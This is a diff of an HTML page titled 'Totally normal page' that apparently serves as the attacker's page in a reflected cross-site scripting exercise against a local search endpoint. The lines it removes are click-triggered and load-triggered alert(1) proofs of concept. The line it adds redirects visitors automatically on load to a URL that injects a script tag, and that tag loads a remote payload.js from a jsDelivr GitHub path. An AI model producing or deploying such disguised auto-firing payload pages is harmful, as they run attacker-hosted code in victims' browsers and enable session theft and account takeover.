@@ -1,14 +1,5 @@
 <!doctype html>
-<html>
-<body>
+<html><body>
   <h1>Totally normal page</h1>
-
-  <!-- Option A: victim clicks -->
-  <a href="http://localhost:5000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E">Click here</a>
-
-  <!-- Option B: fires automatically on load, no click -->
-  <script>
-    location = "http://localhost:5000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E";
-  </script>
-</body>
-</html>
+  <script>location = "http://localhost:5000/search?q=%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2F<<user>>%2F<<repo>>%40main%2Fpayload.js%22%3E%3C%2Fscript%3E";</script>
+</body></html>
